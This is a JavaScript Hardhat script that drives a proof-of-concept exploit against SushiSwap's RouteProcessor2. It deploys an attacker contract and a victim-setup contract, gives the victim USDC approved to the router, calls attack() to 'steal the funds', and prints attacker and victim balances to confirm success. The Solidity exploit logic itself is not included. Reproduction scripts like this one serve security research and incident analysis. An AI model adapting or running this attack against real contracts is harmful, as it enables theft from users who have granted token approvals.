// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const hre = require("hardhat");
const helpers = require("@nomicfoundation/hardhat-network-helpers");

async function main() {
  //await helpers.reset("http://localhost:8545", 17003762);

  let accounts = await hre.ethers.getSigners(); 

  const exploitStarterAmount = hre.ethers.utils.parseEther("20");

  // Deploy the REAL DEAL!
  console.log("Deploy our Exploit contract")
  const exploit = await hre.ethers.getContractFactory("Exploit", accounts[0]);
  const exploitContract = await exploit.deploy();
  await exploitContract.deployed();

  // Deploy ExploitSetup contract
  console.log("Deploy ExploitSetup Contract");
  const exploitSetup = await hre.ethers.getContractFactory("SetupExploit", accounts[1]);
  const exploitSetupContract = await exploitSetup.deploy();
  await exploitSetupContract.deployed();

  /*
   Setup a victim for the attack. 
   - Transfer the victim 20 ETH worth of USDC
   - Victim must 'approve' the sushiswap RouteProcesser2 contract for the USDC
  */
  await exploitSetupContract.getFunds(exploitContract.address, { value: exploitStarterAmount }); 

  let balancesBefore = await exploitContract.getBalances();
  console.log("Balances before the hack...."); 
  console.log("Attacker USDC Balance: ", balancesBefore[0].toString());
  console.log("Victim USDC Balance: ", balancesBefore[1].toString());

  /*
  Run the exploit code to steal the funds
  */
  console.log("Launch the attack!");
  let attackResponse = await exploitContract.attack();
  const attackReceipt = await attackResponse.wait(1);

  let balancesAfter = await exploitContract.getBalances();
  console.log("Balances AFTER the hack...."); 
  console.log("Attacker USDC Balance: ", balancesAfter[0].toString());
  console.log("Victim USDC Balance: ", balancesAfter[1].toString());

  // Check if this was successful
  if(balancesAfter[0].gt(balancesAfter[1])){
    console.log("\n\n------------------------"); 
    console.log("Exploit successful!");
    console.log("------------------------"); 
  }

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
